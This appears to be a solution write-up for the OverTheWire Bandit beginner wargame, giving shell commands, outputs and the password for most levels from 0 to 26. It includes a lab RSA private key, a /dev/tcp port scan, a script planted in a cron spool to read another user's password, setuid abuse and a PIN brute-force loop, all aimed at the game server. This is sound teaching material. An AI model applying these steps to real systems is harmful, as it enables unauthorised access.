# Bandit Writeup

![bandit](https://cdn-images-1.medium.com/max/1600/1*VLXFzVtGx16B1iH81bcTPw.png)
#### The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames. [Play Bandit Wargame](http://overthewire.org/wargames/bandit/ )

##### [+] use : ./levelbandit.sh 0 # the password is bandit0
```
$ cat levelbandit.sh
ssh -l bandit$1 bandit.labs.overthewire.org -p 2220
```
#### [+] Level0
```
bandit0@bandit:~$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```
 
#### [+] Level01
```
bandit1@bandit:~$ cat `find . *`
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```
#### [+] Level02
```
bandit2@bandit:~$ ls
spaces in this filename
bandit2@bandit:~$ cat *
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```
#### [+] Level03
```
bandit3@bandit:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```
#### [+] Level04
```
bandit4@bandit:~/inhere$ cat `find .`
cat: .: Is a directory
N�{��Y�d4���]3�����9(�
Q�����@�%@���ZP*E��1�V���̫*���ۻ��U"7�w���H��ê�Q��(���#����T�v��(�ִ�����A*�
�mu�z���хkoReBOKuIDDepwhWk7jZC0RTdopnAYKh
```
#### [+] Level05
```
bandit5@bandit:~/inhere$ cat `find . -type f -size 1033c ! -executable`
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```
#### [+] Level06
```
bandit6@bandit:~$ cat `find / -type f -size 33c -user bandit7 2>/dev/null`
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
cat: /etc/bandit_pass/bandit7: Permission denied
```
#### [+] Level07
```
bandit7@bandit:~$ cat data.txt |grep -i millionth
millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```
#### [+] Level08
```
bandit8@bandit:~$ cat data.txt |sort -nr|uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```
#### [+] Level09
```
bandit9@bandit:~$ strings data.txt |grep -i ==
2========== the
========== password
========== isa
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
```
#### [+] Level10
```
bandit10@bandit:~$ cat data.txt |base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```
#### [+] Level11
```
bandit11@bandit:~$ cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```
#### [+] Level12
```
bandit12@bandit:/tmp/lorka$ xxd -r data.txt > lala;mv lala lala.gz;gzip -d lala;mv lala lala.bz2;bzip2 -d lala.bz2;mv lala lala.gz;gzip -d lala;mv lala lala.tar;tar xvf lala.tar;mv data5.bin lala.tar;tar xvf lala.tar;mv data6.bin lala.bz2;bzip2 -d lala.bz2;mv lala lala.tar;tar xvf lala.tar;mv data8.bin lala.gz;gzip -d lala.gz;mv lala password;rm -rf *.bin;rm -rf *.tar;cat password
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
bandit12@bandit:/tmp/lorka$
```
#### [+] Level13
```
bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
Could not create directory '/home/bandit13/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```
#### [+] Level14
```
bandit14@bandit:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
```
#### [+] Level15
```
bandit15@bandit:~$ echo "BfMYroe26WYalil77FoDi9qh59eK5xNr" | openssl s_client --connect localhost:30001 -ign_eof |grep -iA2 correct
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
```
#### [+] Level16
```
bandit16@bandit:~$ for i in {31000..32000};do (echo >/dev/tcp/localhost/$i) >/dev/null 2>&1 && echo -e "$i";done
31518
31790
bandit16@bandit:~$ echo -e "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client --connect localhost:31790 -ign_eof
---
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed
```
[+] create file with key in /tmp
```
bandit16@bandit:~$ chmod 400 /tmp/tuki/lala
bandit16@bandit:~$ ssh -i /tmp/tuki/lala bandit17@localhost
Could not create directory '/home/bandit16/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit16/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
```
#### [+] Level17
```
bandit17@bandit:~$ diff passwords.new passwords.old
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd <<<THIS IS PASSWORD
---
> hlbSBPAWJmL6WFDb06gpTx1pPButblOA
```
#### [+] Level18
```
$ ssh -l bandit18 bandit.labs.overthewire.org -p 2220 cat readme
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password:
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```
#### [+] Level19
```
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```
#### [+] Level20
![level20](level20.png)
```
bandit21@bandit:~$ cat /etc/bandit_pass/bandit21
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```
#### [+] Level21
```
bandit21@bandit:~$ ls /etc/cron.d/
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```
#### [+] Level22
```
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

bandit22@bandit:~$ myname=bandit23;mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1);cat /tmp/$mytarget
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```
#### [+] Level23
```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done

bandit23@bandit:~$ echo -e "cp /etc/bandit_pass/bandit24 lorka;chmod 777 lorka" > "/var/spool/bandit24/lala";chmod +x "/var/spool/bandit24/lala";echo -e "[+] Espera 30segundos";sleep 30;cat "/var/spool/bandit24/lorka"
[+] Espera 30segundos
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
#### [+] Level24
```
bandit24@bandit:/tmp/fififi$ for i in {8529..8531}; do echo $i;echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | timeout 0.6 nc localhost 1 30002 |grep -vi wrong|grep -v pincode;done

8530
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```
#### [+] Level25
[![asciicast](https://asciinema.org/a/9HaIG6w8GckqS4eeyBccpuvuL.svg)](https://asciinema.org/a/9HaIG6w8GckqS4eeyBccpuvuL)
```
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```
#### [+] Level26
```
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```
#### [+] Level27
```

```
#### [+] Level28
```

```
#### [+] Level29
```

```
#### [+] Level30
```

```
#### [+] Level31
```

```
#### [+] Level32
```

```
#### [+] Level33
```

```
#### [+] Level34
```

